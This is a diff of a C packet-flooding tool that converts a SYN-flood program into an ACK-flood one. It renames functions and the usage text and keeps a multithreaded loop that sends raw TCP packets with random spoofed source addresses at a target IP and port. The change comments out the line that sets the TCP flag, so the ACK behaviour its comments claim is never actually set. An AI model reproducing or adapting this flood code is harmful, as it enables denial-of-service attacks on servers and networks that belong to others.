@@ -1,5 +1,5 @@
 /*************************************************************************
-    > File Name: syn_flood.c
+    > File Name: ack_flood.c
     > Author: Jiange
     > Mail: jiangezh@qq.com 
     > Created Time: 2016年01月01日 星期五 22时32分34秒
@@ -86,7 +86,7 @@ unsigned short check_sum (unsigned short *buffer, unsigned short size){
 	return((unsigned short )(~cksum));
 }
 
-/* 发送SYN包函数
+/* 发送ACK包函数
  * 填写IP头部，TCP头部
  * TCP伪头部仅用于校验和的计算
 
@@ -111,7 +111,7 @@ void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudohead
 	tcp->seq = htonl( rand()%90000000 + 2345 ); 
 	tcp->ack = 0; 
 	tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
-	tcp->flag = 0x02;
+	//tcp->flag = 0x10;			// SYN = 0x02		ACK = 0x10
 	tcp->win = htons (2048);  
 	tcp->sum = 0;
 	tcp->urp = 0;
@@ -126,11 +126,11 @@ void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudohead
 }
 
 
-/* 发送SYN包函数
+/* 发送ACK包函数
  * 填写IP头部，TCP头部
  * TCP伪头部仅用于校验和的计算
  */
-void* send_synflood(void *addr_info){
+void* send_ackflood(void *addr_info){
         struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
@@ -144,7 +144,7 @@ void* send_synflood(void *addr_info){
 	/* 初始化头部信息 */
 	init_header(&ip, &tcp, &pseudoheader);
 	
-	/* 处于活动状态时持续发送SYN包 */
+	/* 处于活动状态时持续发送ACK包 */
 	while(alive){
 		ip.sourceIP = rand();
 
@@ -193,8 +193,8 @@ int main(int argc, char *argv[]){
 	signal(SIGINT, sig_int);
 
 	/* 参数是否数量正确 */
-	if(argc < 3){
-		printf("usage: syn <IPaddress> <Port>\n");
+	if(argc < 3 || argc > 3){
+		printf("usage: ack <IPaddress> <Port>\n");
 		exit(1);
 	}
 
@@ -243,7 +243,7 @@ int main(int argc, char *argv[]){
 
 	/* 建立多个线程协同工作 */
 	for(i=0; i<MAXCHILD; i++){
-		err = pthread_create(&pthread[i], NULL, send_synflood, (void *)&addr);
+		err = pthread_create(&pthread[i], NULL, send_ackflood, (void *)&addr);
 		if(err != 0){
 			perror("pthread_create()");
 			exit(1);
